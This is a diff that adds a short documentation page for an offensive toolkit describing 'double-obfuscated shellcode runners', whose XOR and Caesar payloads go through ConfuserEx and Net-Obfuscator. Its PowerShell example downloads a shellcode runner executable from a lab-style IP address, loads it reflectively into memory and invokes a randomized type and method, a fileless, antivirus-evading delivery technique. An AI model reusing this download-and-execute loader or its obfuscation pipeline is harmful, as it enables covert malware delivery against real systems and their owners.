@@ -1,0 +1,18 @@
+---
+title: "ConfuserEx + Net-Obfuscator"
+description: "Double-obfuscated shellcode runners."
+---
+
+Payloads from `payloads/XOR/` and `payloads/Caesar/` are fed through **ConfuserEx** then **Net-Obfuscator**, dynamically obfuscating `GetType` and `GetMethod` values.
+
+## Reflective Execution Example
+
+```powershell
+$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe')
+$ass=[System.Reflection.Assembly]::Load($data)
+$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
+```
+
+<Note>
+The type and method names are randomized per generation.
+</Note>
